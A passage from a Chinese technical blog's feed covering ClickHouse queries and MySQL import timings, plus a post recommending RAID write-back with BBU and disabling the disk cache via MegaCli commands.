;&#x7F13;&#x5B58;&#x3002;</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">$ clickhouse-client</span><br><span class="line">ClickHouse client version 0.0.52053.</span><br><span class="line">Connecting to localhost:9000.</span><br><span class="line">Connected to ClickHouse server version 0.0.52053.</span><br><span class="line"></span><br><span class="line">:) SELECT CounterID, count() FROM hits GROUP BY CounterID ORDER BY count() DESC LIMIT 20</span><br><span class="line"></span><br><span class="line">SELECT</span><br><span class="line">    CounterID,</span><br><span class="line">    count()</span><br><span class="line">FROM hits</span><br><span class="line">GROUP BY CounterID</span><br><span class="line">ORDER BY count() DESC</span><br><span class="line">LIMIT 20</span><br><span class="line"></span><br><span class="line">&#x250C;&#x2500;CounterID&#x2500;&#x252C;&#x2500;&#x2500;count()&#x2500;&#x2510;</span><br><span class="line">&#x2502;    114208 &#x2502; 56057344 &#x2502;</span><br><span class="line">&#x2502;    115080 &#x2502; 51619590 &#x2502;</span><br><span class="line">&#x2502;      3228 &#x2502; 44658301 &#x2502;</span><br><span class="line">&#x2502;     38230 &#x2502; 42045932 &#x2502;</span><br><span class="line">&#x2502;    145263 &#x2502; 42042158 &#x2502;</span><br><span class="line">&#x2502;     91244 &#x2502; 38297270 &#x2502;</span><br><span class="line">&#x2502;    154139 &#x2502; 26647572 &#x2502;</span><br><span class="line">&#x2502;    150748 &#x2502; 24112755 &#x2502;</span><br><span class="line">&#x2502;    242232 &#x2502; 21302571 &#x2502;</span><br><span class="line">&#x2502;    338158 &#x2502; 13507087 &#x2502;</span><br><span class="line">&#x2502;     62180 &#x2502; 12229491 &#x2502;</span><br><span class="line">&#x2502;     82264 &#x2502; 12187441 &#x2502;</span><br><span class="line">&#x2502;    232261 &#x2502; 12148031 &#x2502;</span><br><span class="line">&#x2502;    146272 &#x2502; 11438516 &#x2502;</span><br><span class="line">&#x2502;    168777 &#x2502; 11403636 &#x2502;</span><br><span class="line">&#x2502;   4120072 &#x2502; 11227824 &#x2502;</span><br><span class="line">&#x2502;  10938808 &#x2502; 10519739 &#x2502;</span><br><span class="line">&#x2502;     74088 &#x2502;  9047015 &#x2502;</span><br><span class="line">&#x2502;    115079 &#x2502;  8837972 &#x2502;</span><br><span class="line">&#x2502;    337234 &#x2502;  8205961 &#x2502;</span><br><span class="line">&#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2534;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;</span><br><span class="line"></span><br><span class="line">20 rows <span class="keyword">in</span> <span class="built_in">set</span>. Elapsed: 0.153 sec. Processed 1.00 billion rows, 4.00 GB (6.53 billion rows/s., 26.10 GB/s.)</span><br><span class="line"></span><br><span class="line">:)</span><br></pre></td></tr></tbody></table></figure><h4 id="ClickHouse-SQL"><a href="#ClickHouse-SQL" class="headerlink" title="ClickHouse SQL"></a>ClickHouse SQL</h4><p>Creating a Table<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE [IF NOT EXISTS] [db.]table_name [ON CLUSTER cluster]</span><br><span class="line">(</span><br><span class="line">    name1 [type1] [DEFAULT|MATERIALIZED|ALIAS expr1],</span><br><span class="line">    name2 [type2] [DEFAULT|MATERIALIZED|ALIAS expr2],</span><br><span class="line">    ...</span><br><span class="line">    INDEX index_name1 expr1 TYPE type1(...) GRANULARITY value1,</span><br><span class="line">    INDEX index_name2 expr2 TYPE type2(...) GRANULARITY value2</span><br><span class="line">) ENGINE = MergeTree()</span><br><span class="line">[PARTITION BY expr]</span><br><span class="line">[ORDER BY expr]</span><br><span class="line">[PRIMARY KEY expr]</span><br><span class="line">[SAMPLE BY expr]</span><br><span class="line">[SETTINGS name=value, ...]</span><br></pre></td></tr></tbody></table></figure><p></p><p>Example of sections setting<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ENGINE MergeTree() PARTITION BY toYYYYMM(EventDate) ORDER BY (CounterID, EventDate, intHash32(UserID)) SAMPLE BY intHash32(UserID) SETTINGS index_granularity=8192</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="MySQL-&#x6570;&#x636E;&#x5BFC;&#x5165;&#x6D4B;&#x8BD5;"><a href="#MySQL-&#x6570;&#x636E;&#x5BFC;&#x5165;&#x6D4B;&#x8BD5;" class="headerlink" title="MySQL &#x6570;&#x636E;&#x5BFC;&#x5165;&#x6D4B;&#x8BD5;"></a>MySQL &#x6570;&#x636E;&#x5BFC;&#x5165;&#x6D4B;&#x8BD5;</h2><h4 id="&#x6D4B;&#x8BD5;&#x4E00;"><a href="#&#x6D4B;&#x8BD5;&#x4E00;" class="headerlink" title="&#x6D4B;&#x8BD5;&#x4E00;"></a>&#x6D4B;&#x8BD5;&#x4E00;</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># du&#x51FA;&#x7684;&#x8868;&#x5927;&#x5C0F;</span></span><br><span class="line">5.5G    test_1.ibd</span><br><span class="line"><span class="comment"># ClickHouse&#x64CD;&#x4F5C;&#x8BED;&#x53E5;</span></span><br><span class="line">CREATE TABLE test_1</span><br><span class="line">ENGINE = MergeTree</span><br><span class="line">ORDER BY id AS</span><br><span class="line">SELECT *</span><br><span class="line">FROM mysql(<span class="string">&apos;host:port&apos;</span>, <span class="string">&apos;dbtest&apos;</span>, <span class="string">&apos;test_1&apos;</span>, <span class="string">&apos;user&apos;</span>, <span class="string">&apos;password&apos;</span>) </span><br><span class="line"><span class="comment"># &#x8017;&#x65F6;&#x548C;&#x5E73;&#x5747;&#x901F;&#x5EA6;</span></span><br><span class="line">0 rows <span class="keyword">in</span> <span class="built_in">set</span>. Elapsed: 137.251 sec. Processed 18.59 million rows, 7.34 GB (135.43 thousand rows/s., 53.48 MB/s.)</span><br></pre></td></tr></tbody></table></figure><h4 id="&#x6D4B;&#x8BD5;&#x4E8C;"><a href="#&#x6D4B;&#x8BD5;&#x4E8C;" class="headerlink" title="&#x6D4B;&#x8BD5;&#x4E8C;"></a>&#x6D4B;&#x8BD5;&#x4E8C;</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x53E6;&#x4E00;&#x4E2A;&#x8868;</span></span><br><span class="line">20G     test_2.ibd</span><br><span class="line">CREATE TABLE test_2</span><br><span class="line">ENGINE = MergeTree</span><br><span class="line">ORDER BY id AS</span><br><span class="line">SELECT *</span><br><span class="line">FROM mysql(<span class="string">&apos;host:port&apos;</span>, <span class="string">&apos;dbtest&apos;</span>, <span class="string">&apos;test_2&apos;</span>, <span class="string">&apos;user&apos;</span>, <span class="string">&apos;password&apos;</span>) </span><br><span class="line"><span class="comment"># &#x4E0D;&#x77E5;&#x9053;&#x4E3A;&#x5565;&#x8FD9;&#x8868;&#x8FD9;&#x4E48;&#x5FEB;&#x5C31;&#x5BFC;&#x5165;&#x4E86; &#x8C8C;&#x4F3C;&#x662F;&#x884C;&#x5C11;&#xFF0C;&#x4F46;&#x662F;&#x8868;&#x7684;&#x603B;&#x5927;&#x5C0F;&#x5927;&#x554A;</span></span><br><span class="line">0 rows <span class="keyword">in</span> <span class="built_in">set</span>. Elapsed: 44.389 sec. Processed 13.03 million rows, 1.44 GB (293.44 thousand rows/s., 32.35 MB/s.)</span><br></pre></td></tr></tbody></table></figure><h2 id="&#x53C2;&#x8003;"><a href="#&#x53C2;&#x8003;" class="headerlink" title="&#x53C2;&#x8003;"></a>&#x53C2;&#x8003;</h2><p><a href="https://clickhouse.yandex/docs/zh/" target="_blank" rel="noopener">ClickHouse &#x5B98;&#x65B9;&#x8D44;&#x6599;</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x524D;&amp;#x8A00;&quot;&gt;&lt;a href=&quot;#&amp;#x524D;&amp;#x8A00;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x524D;&amp;#x8A00;&quot;&gt;&lt;/a&gt;&amp;#x524D;&amp;#x8A00;&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;ClickHou
      
    
    </summary>
    
      <category term="ClickHouse" scheme="https://jiemin.wang/categories/ClickHouse/"/>
    
      <category term="MySQL" scheme="https://jiemin.wang/categories/ClickHouse/MySQL/"/>
    
    
      <category term="ClickHouse" scheme="https://jiemin.wang/tags/ClickHouse/"/>
    
      <category term="MySQL" scheme="https://jiemin.wang/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>disk cache policy in RAID</title>
    <link href="https://jiemin.wang/2019/03/11/disk-cache-policy-in-RAID/"/>
    <id>https://jiemin.wang/2019/03/11/disk-cache-policy-in-RAID/</id>
    <published>2019-03-11T13:33:12.000Z</published>
    <updated>2019-03-11T13:39:43.204Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x5F15;&#x8A00;"><a href="#&#x5F15;&#x8A00;" class="headerlink" title="&#x5F15;&#x8A00;"></a>&#x5F15;&#x8A00;</h2><h4 id="&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x80CC;&#x540E;&#xFF0C;&#x5B57;&#x5B57;&#x90FD;&#x662F;&#x8840;&#x6CEA;&#x3002;&#x66FE;&#x7ECF;&#x56E0;&#x4E3A;EXT4-fs-error&#xFF0C;&#x4ECE;&#x591C;&#x91CC;10&#x70B9;&#x62A2;&#x6551;&#x6570;&#x636E;&#x5230;&#x51CC;&#x6668;7&#x70B9;&#xFF0C;-&#x7761;&#x4E00;&#x4E2A;&#x5C0F;&#x65F6;&#x5019;&#x4E4B;&#x540E;&#xFF0C;&#x5403;&#x996D;&#xFF0C;&#x89C1;&#x5BA2;&#x6237;&#xFF0C;&#x544A;&#x8BC9;&#x5BA2;&#x6237;&#x6570;&#x636E;&#x6062;&#x590D;&#x56DE;&#x6765;&#x4E86;&#x3002;"><a href="#&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x80CC;&#x540E;&#xFF0C;&#x5B57;&#x5B57;&#x90FD;&#x662F;&#x8840;&#x6CEA;&#x3002;&#x66FE;&#x7ECF;&#x56E0;&#x4E3A;EXT4-fs-error&#xFF0C;&#x4ECE;&#x591C;&#x91CC;10&#x70B9;&#x62A2;&#x6551;&#x6570;&#x636E;&#x5230;&#x51CC;&#x6668;7&#x70B9;&#xFF0C;-&#x7761;&#x4E00;&#x4E2A;&#x5C0F;&#x65F6;&#x5019;&#x4E4B;&#x540E;&#xFF0C;&#x5403;&#x996D;&#xFF0C;&#x89C1;&#x5BA2;&#x6237;&#xFF0C;&#x544A;&#x8BC9;&#x5BA2;&#x6237;&#x6570;&#x636E;&#x6062;&#x590D;&#x56DE;&#x6765;&#x4E86;&#x3002;" class="headerlink" title="&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x80CC;&#x540E;&#xFF0C;&#x5B57;&#x5B57;&#x90FD;&#x662F;&#x8840;&#x6CEA;&#x3002;&#x66FE;&#x7ECF;&#x56E0;&#x4E3A;EXT4-fs error&#xFF0C;&#x4ECE;&#x591C;&#x91CC;10&#x70B9;&#x62A2;&#x6551;&#x6570;&#x636E;&#x5230;&#x51CC;&#x6668;7&#x70B9;&#xFF0C; &#x7761;&#x4E00;&#x4E2A;&#x5C0F;&#x65F6;&#x5019;&#x4E4B;&#x540E;&#xFF0C;&#x5403;&#x996D;&#xFF0C;&#x89C1;&#x5BA2;&#x6237;&#xFF0C;&#x544A;&#x8BC9;&#x5BA2;&#x6237;&#x6570;&#x636E;&#x6062;&#x590D;&#x56DE;&#x6765;&#x4E86;&#x3002;"></a>&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x80CC;&#x540E;&#xFF0C;&#x5B57;&#x5B57;&#x90FD;&#x662F;&#x8840;&#x6CEA;&#x3002;&#x66FE;&#x7ECF;&#x56E0;&#x4E3A;EXT4-fs error&#xFF0C;&#x4ECE;&#x591C;&#x91CC;10&#x70B9;&#x62A2;&#x6551;&#x6570;&#x636E;&#x5230;&#x51CC;&#x6668;7&#x70B9;&#xFF0C; &#x7761;&#x4E00;&#x4E2A;&#x5C0F;&#x65F6;&#x5019;&#x4E4B;&#x540E;&#xFF0C;&#x5403;&#x996D;&#xFF0C;&#x89C1;&#x5BA2;&#x6237;&#xFF0C;&#x544A;&#x8BC9;&#x5BA2;&#x6237;&#x6570;&#x636E;&#x6062;&#x590D;&#x56DE;&#x6765;&#x4E86;&#x3002;</h4><h2 id="&#x539F;&#x7406;"><a href="#&#x539F;&#x7406;" class="headerlink" title="&#x539F;&#x7406;"></a>&#x539F;&#x7406;</h2><h4 id="&#x9996;&#x5148;&#xFF0C;RAID&#x7684;write-policy&#x5206;&#x6210;&#x4E24;&#x79CD;&#xFF1A;"><a href="#&#x9996;&#x5148;&#xFF0C;RAID&#x7684;write-policy&#x5206;&#x6210;&#x4E24;&#x79CD;&#xFF1A;" class="headerlink" title="&#x9996;&#x5148;&#xFF0C;RAID&#x7684;write policy&#x5206;&#x6210;&#x4E24;&#x79CD;&#xFF1A;"></a>&#x9996;&#x5148;&#xFF0C;RAID&#x7684;write policy&#x5206;&#x6210;&#x4E24;&#x79CD;&#xFF1A;</h4><ul><li>write back</li><li>write through</li></ul><p>&#x4E00;&#x79CD;&#x6A21;&#x5F0F;&#x662F;write back&#x4F1A;&#x6709;&#x66F4;&#x597D;&#x7684;&#x6027;&#x80FD;&#x3002;&#x56E0;&#x4E3A;&#x5728;write back&#x6A21;&#x5F0F;&#x4E0B;&#xFF0C;&#x6570;&#x636E;&#x5199;&#x5165;Controller Cache&#xFF0C;&#x5C31;&#x8BA4;&#x4E3A;Write IO&#x7ED3;&#x675F;&#x4E86;&#xFF0C;&#x800C;&#x4E0D;&#x9700;&#x8981;&#x7B49;&#x5F85;&#x5199;&#x5165;Hard driver&#x3002;&#x8FD9;&#x79CD;&#x6A21;&#x5F0F;&#x5F88;&#x660E;&#x663E;&#x5B58;&#x5728;&#x5B89;&#x5168;&#x9690;&#x60A3;&#xFF0C;&#x5F02;&#x5E38;&#x6389;&#x7535;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5F88;&#x5BB9;&#x6613;&#x5F15;&#x8D77;&#x6570;&#x636E;&#x4E22;&#x5931;&#x3002;</p><p>&#x53E6;&#x4E00;&#x79CD;&#x6A21;&#x5F0F;&#x662F;write through&#xFF0C;&#x8FD9;&#x79CD;&#x6A21;&#x5F0F;&#x6BD4;&#x8F83;&#x8C28;&#x614E;&#xFF0C;&#x5B83;&#x538B;&#x6839;&#x4E0D;&#x4F7F;&#x7528;Raid Cache&#x6765;&#x52A0;&#x901F;&#x5199;&#x64CD;&#x4F5C;&#xFF0C;&#x56E0;&#x6B64;&#x8FD9;&#x79CD;&#x6A21;&#x5F0F;&#x7684;&#x6027;&#x80FD;&#x8981;&#x6BD4;write back &#x4F4E;&#x4E0D;&#x5C11;&#x3002;</p><p>&#x4F46;&#x662F;write back&#x7684;&#x4E0D;&#x5B89;&#x5168;&#x4E5F;&#x662F;&#x6709;&#x529E;&#x6CD5;&#x89E3;&#x51B3;&#x7684;&#xFF1A;</p><ul><li>&#x7B2C;&#x4E00;&#x4E2A;&#x65B9;&#x6848;&#x662F;UPS&#x2013;Uninterruptible Power Supply&#xFF0C;&#x8FD9;&#x4E2A;&#x6309;&#x4E0B;&#x4E0D;&#x63D0;</li><li>&#x7B2C;&#x4E8C;&#x4E2A;&#x65B9;&#x6848;&#x662F;BBU&#x2013;Backup Battery Unit&#xFF0C;&#x6709;&#x4E86;BBU&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5B89;&#x5FC3;&#x5730;&#x91C7;&#x7528;write-back&#x6A21;&#x5F0F;&#x4E86;</li></ul><p>&#x5BF9;BBU&#x4E0D;&#x592A;&#x4E86;&#x89E3;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x9605;&#x8BFB;[Barriers, Caches, Filesystems]&#xFF0C;&#x4ECB;&#x7ECD;&#x7684;&#x975E;&#x5E38;&#x597D;</p><p>&#x8BB2;&#x5B8C;&#x4E86;&#x8FD9;&#x4E2A;write policy&#xFF0C;&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x4E1C;&#x4E1C;&#x53EB;disk cache policy&#xFF0C;&#x8FD9;&#x4E2A;&#x4E1C;&#x897F;&#x7528;&#x6765;&#x51B3;&#x5B9A;&#x78C1;&#x76D8;&#x4E00;&#x7EA7;&#x7684;cache&#x662F;&#x5426;enable&#x3002; &#x4E00;&#x5B9A;&#x8981;&#x6CE8;&#x610F;&#x8FD9;&#x4E2A;&#x4E1C;&#x897F;&#xFF0C;&#x65E0;&#x6570;&#x8840;&#x6CEA;&#x90FD;&#x662F;&#x8FD9;&#x4E2A;&#x4E1C;&#x897F;&#x5F15;&#x8D77;&#x7684;&#x3002;</p><p>&#x5982;&#x679C;&#x9009;&#x62E9;write through&#x6A21;&#x5F0F;&#xFF0C;&#x5373;&#x4E0D;&#x4F7F;&#x7528;RAID cache&#xFF0C;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;disk cache&#x5BF9;&#x6027;&#x80FD;&#x7684;&#x63D0;&#x5347;&#x662F;&#x5F88;&#x5927;&#x7684;&#x3002;&#x4F46;&#x662F;&#x5C3D;&#x7BA1;&#x5982;&#x6B64;&#xFF0C;&#x4E5F;&#x4E0D;&#x8981;enable disk cache&#xFF0C;&#x56E0;&#x4E3A;&#xFF0C;&#x4F1A;&#x6709;&#x6570;&#x636E;&#x4E22;&#x5931;&#x7684;&#x98CE;&#x9669;&#x3002;&#x5982;&#x679C;&#x53EF;&#x80FD;&#x5F02;&#x5E38;&#x6389;&#x7535;&#xFF0C;&#x90A3;&#x4E48;&#x4E00;&#x5B9A;&#x4E0D;&#x8981;enable disk cache&#x3002;</p><h2 id="&#x76F8;&#x5173;&#x547D;&#x4EE4;"><a href="#&#x76F8;&#x5173;&#x547D;&#x4EE4;" class="headerlink" title="&#x76F8;&#x5173;&#x547D;&#x4EE4;"></a>&#x76F8;&#x5173;&#x547D;&#x4EE4;</h2><h4 id="&#x67E5;&#x770B;write-policy-&#x548C;-disk-cache-policy&#x7684;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#xFF1A;"><a href="#&#x67E5;&#x770B;write-policy-&#x548C;-disk-cache-policy&#x7684;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#xFF1A;" class="headerlink" title="&#x67E5;&#x770B;write policy &#x548C; disk cache policy&#x7684;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#xFF1A;"></a>&#x67E5;&#x770B;write policy &#x548C; disk cache policy&#x7684;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#xFF1A;</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/MegaRAID/MegaCli/MegaCli64 -LDInfo -Lall -aAll</span><br></pre></td></tr></tbody></table></figure><p>&#x8F93;&#x51FA;&#x5982;&#x4E0B;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Virtual Drive: 1 (Target Id: 1)</span><br><span class="line">Name                :</span><br><span class="line">RAID Level          : Primary-5, Secondary-0, RAID Level Qualifier-3</span><br><span class="line">Size                : 25.466 TB</span><br><span class="line">Sector Size         : 512</span><br><span class="line">Is VD emulated      : No</span><br><span class="line">Parity Size         : 3.637 TB</span><br><span class="line">State               : Optimal</span><br><span class="line">Strip Size          : 128 KB</span><br><span class="line">Number Of Drives    : 8</span><br><span class="line">Span Depth          : 1</span><br><span class="line">Default Cache Policy: WriteBack, ReadAhead, Direct, No Write Cache <span class="keyword">if</span> Bad BBU</span><br><span class="line">Current Cache Policy: WriteBack, ReadAhead, Direct, No Write Cache <span class="keyword">if</span> Bad BBU</span><br><span class="line">Default Access Policy: Read/Write</span><br><span class="line">Current Access Policy: Read/Write</span><br><span class="line">Disk Cache Policy   : Disk<span class="string">&apos;s Default</span></span><br><span class="line"><span class="string">Encryption Type     : None</span></span><br><span class="line"><span class="string">PI type: No PI</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Is VD Cached: No</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;Disk Cache Policy &#x662F; Disk&#x2019;s Default &#x3002;&#x8FD9;&#x4E2A;default&#x503C;&#x53EF;&#x4EE5;&#x5206;&#x6210;&#x4EE5;&#x4E0B;&#x60C5;&#x51B5;&#xFF1A;</p><ul><li>For virtual disks containing SATA disks &#xFF0C; Enabled</li><li>For virtual disks containing SAS disks &#xFF0C; Disabled</li></ul><p>&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x5C06;Disk Cache Policy&#x7684;&#x503C;&#x6539;&#x6210; Disable<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/MegaRAID/MegaCli/MegaCli64 -LDSetProp -DisDskCache -Immediate -Lall -aAll</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8F93;&#x51FA;&#x5982;&#x4E0B;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Set Disk Cache Policy to Disabled on Adapter 0, VD 0 (target id: 0) success</span><br><span class="line">Set Disk Cache Policy to Disabled on Adapter 0, VD 1 (target id: 1) success</span><br><span class="line">Set Disk Cache Policy to Disabled on Adapter 0, VD 2 (target id: 2) success</span><br><span class="line">Set Disk Cache Policy to Disabled on Adapter 0, VD 3 (target id: 3) success</span><br><span class="line">Set Disk Cache Policy to Disabled on Adapter 0, VD 4 (target id: 4) success</span><br><span class="line">Set Disk Cache Policy to Disabled on Adapter 0, VD 5 (target id: 5) success</span><br><span class="line">Set Disk Cache Policy to Disabled on Adapter 0, VD 6 (target id: 6) success</span><br><span class="line"></span><br><span class="line">Exit Code: 0x00</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6B64;&#x65F6;&#x518D;&#x6B21;&#x67E5;&#x770B;&#x8F93;&#x51FA;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Virtual Drive: 1 (Target Id: 1)</span><br><span class="line">Name                :</span><br><span class="line">RAID Level          : Primary-5, Secondary-0, RAID Level Qualifier-3</span><br><span class="line">Size                : 25.466 TB</span><br><span class="line">Sector Size         : 512</span><br><span class="line">Is VD emulated      : No</span><br><span class="line">Parity Size         : 3.637 TB</span><br><span class="line">State               : Optimal</span><br><span class="line">Strip Size          : 128 KB</span><br><span class="line">Number Of Drives    : 8</span><br><span class="line">Span Depth          : 1</span><br><span class="line">Default Cache Policy: WriteBack, ReadAhead, Direct, No Write Cache <span class="keyword">if</span> Bad BBU</span><br><span class="line">Current Cache Policy: WriteBack, ReadAhead, Direct, No Write Cache <span class="keyword">if</span> Bad BBU</span><br><span class="line">Default Access Policy: Read/Write</span><br><span class="line">Current Access Policy: Read/Write</span><br><span class="line">Disk Cache Policy   : Disabled</span><br><span class="line">Encryption Type     : None</span><br><span class="line">PI <span class="built_in">type</span>: No PI</span><br><span class="line"></span><br><span class="line">Is VD Cached: No</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x63A8;&#x8350;&#x8BBE;&#x7F6E;"><a href="#&#x63A8;&#x8350;&#x8BBE;&#x7F6E;" class="headerlink" title="&#x63A8;&#x8350;&#x8BBE;&#x7F6E;"></a>&#x63A8;&#x8350;&#x8BBE;&#x7F6E;</h2><p>1.&#x5546;&#x7528;&#x73AF;&#x5883;&#xFF0C;RAID&#x4E00;&#x5B9A;&#x8981;&#x6709;BBU<br>2.write policy &#x91C7;&#x7528; write back<br>3.disk cache policy &#x4E00;&#x5B9A;&#x8981;&#x4E3A;disable</p><p>&#x8FD9;&#x4E2A;&#x63A8;&#x8350;&#x8BBE;&#x7F6E;&#xFF0C;&#x548C;Intel&#x7ED9;&#x51FA;&#x7684; <a href="http://download.intel.com/support/motherboards/server/sb/configuring_raid_for_optimal_perfromance_11.pdf" target="_blank" rel="noopener">Configuring RAID For Optimal Performance</a> &#x662F;&#x4E00;&#x81F4;&#x7684;&#xFF0C;&#x9664;&#x6B64;&#x4EE5;&#x5916;&#xFF0C;<a href="https://www.thomas-krenn.com/en/wiki/RAID_Controller_and_Hard_Disk_Cache_Settings" target="_blank" rel="noopener">RAID Controller and Hard Disk Cache Settings</a>&#x4E5F;&#x7ED9;&#x51FA;&#x4E86;&#x7C7B;&#x4F3C;&#x7684;&#x7ED3;&#x8BBA;&#x3002;&#x8FD9;&#x4E9B;&#x90FD;&#x662F;&#x4E0D;&#x9519;&#x7684;&#x53C2;&#x8003;&#x6587;&#x732E;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x5F15;&amp;#x8A00;&quot;&gt;&lt;a href=&quot;#&amp;#x5F15;&amp;#x8A00;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x5F15;&amp;#x8A00;&quot;&gt;&lt;/a&gt;&amp;#x5F15;&amp;#x8A00;&lt;/h2&gt;&lt;h4 id=&quot;&amp;#x8FD9;&amp;
      
    
    </summary>
    
      <category term="Linux" scheme="https://jiemin.wang/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://jiemin.wang/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>check e2fsck progress realtime</title>
    <link href="https://jiemin.wang/2019/03/11/check-e2fsck-progress-realtime/"/>
    <id>https://jiemin.wang/2019/03/11/check-e2fsck-progress-realtime/</id>
    <published>2019-03-11T13:30:24.000Z</published>
    <updated>2019-03-11T13:31:59.698Z</updated>
    
